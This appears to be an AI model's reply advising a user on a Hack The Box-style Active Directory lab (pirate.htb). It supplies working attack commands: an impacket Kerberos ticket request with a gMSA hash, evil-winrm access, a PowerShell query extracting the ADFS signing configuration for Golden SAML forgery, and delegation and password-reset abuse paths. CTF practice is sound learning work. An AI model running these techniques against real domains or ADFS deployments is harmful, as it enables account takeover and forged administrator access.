**You're closer than you think. Here's what stands out:**

You have WinRM on DC01 as gMSA_ADFS_prod$, the DKM key, and WEB01 is reachable from DC01 on ports 445, 5985, and 80. The path is basically staring at you:

**Priority 1 is the double-hop fix for WEB01 via Kerberos:**

bash

```bash
# From your attack box — get TGT for gMSA_ADFS_prod$
impacket-getTGT pirate.htb/'gMSA_ADFS_prod$' -hashes :8126756fb2e69697bfcb04816e685839 -dc-ip 10.129.244.95

# Then try WinRM to WEB01 directly
export KRB5CCNAME=gMSA_ADFS_prod\$.ccache
evil-winrm -i 192.168.100.2 -r pirate.htb
```

You noted Invoke-Command to WEB01 failed due to double-hop — but gMSA_ADFS_prod$ has SPN `host/adfs.pirate.htb` which means it has a legit Kerberos identity. Getting a TGT for it and authenticating directly from your box (not through DC01) bypasses the double-hop entirely.

**If WEB01 WinRM opens up — Golden SAML is your root path:**

You literally have everything you need except the signing cert private key sitting in WID on WEB01. Once you're on WEB01:

powershell

```powershell
# Connect to WID
$conn = New-Object System.Data.SqlClient.SqlConnection
$conn.ConnectionString = "Server=\\.\pipe\MICROSOFT##WID\tsql\query;Database=AdfsConfigurationV4;Trusted_Connection=True;"
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT ServiceSettingsData FROM IdentityServerPolicy.ServiceSettings"
$reader = $cmd.ExecuteReader()
$reader.Read()
$reader.GetString(0)
```

Then decrypt with your DKM key and forge SAML as Administrator.

**One other thing I noticed:**

a.white_adm has constrained delegation to `HTTP/WEB01` — that's S4U2Proxy to WEB01's HTTP service. If you can get a.white's creds (ForceChangePassword) and reset a.white_adm's password, you have another path to WEB01 that doesn't need Kerberos double-hop gymnastics.